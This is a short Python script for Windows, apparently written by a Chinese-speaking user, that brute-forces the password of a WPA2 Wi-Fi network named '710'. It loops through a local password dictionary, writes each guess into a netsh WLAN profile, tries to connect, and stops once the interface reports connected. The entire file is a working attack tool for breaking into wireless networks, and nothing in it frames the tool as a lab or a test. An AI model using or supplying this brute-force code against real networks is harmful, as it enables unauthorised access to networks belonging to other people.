import subprocess
import time

wifi_name = "710"

# with open(r"C:\Users\Administrator\Desktop\password_dict\online_brute.txt", 'r', encoding='utf-8') as f:
with open(r"C:\Users\Administrator\Desktop\password_dict\Top304Thousand-probable-v2.txt", 'r', encoding='utf-8') as f:
    f = f.readlines()
    passwords = [_.replace('\n', '') for _ in list(f)][65:]

for pwd in passwords:
    print(f"尝试密码：{pwd}")
    subprocess.run(f'netsh wlan delete profile name="{wifi_name}"', shell=True)

    with open("wifi_profile.xml", "w", encoding="utf-8") as f:
        f.write(f'''<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{wifi_name}</name>
    <SSIDConfig><SSID><name>{wifi_name}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM><security><authEncryption><authentication>WPA2PSK</authentication>
    <encryption>AES</encryption><useOneX>false</useOneX></authEncryption>
    <sharedKey><keyType>passPhrase</keyType><protected>false</protected>
    <keyMaterial>{pwd}</keyMaterial></sharedKey></security></MSM>
</WLANProfile>''')

    subprocess.run(f'netsh wlan add profile filename="wifi_profile.xml"', shell=True)
    subprocess.run(f'netsh wlan connect name="{wifi_name}"', shell=True)
    time.sleep(5)

    result = subprocess.run("netsh wlan show interfaces", capture_output=True, text=True)
    if wifi_name in result.stdout and "已连接" in result.stdout:
        print(f"🎉 找到正确密码：{pwd}")
        break
else:
    print("❌ 没有成功，请尝试其他方法")
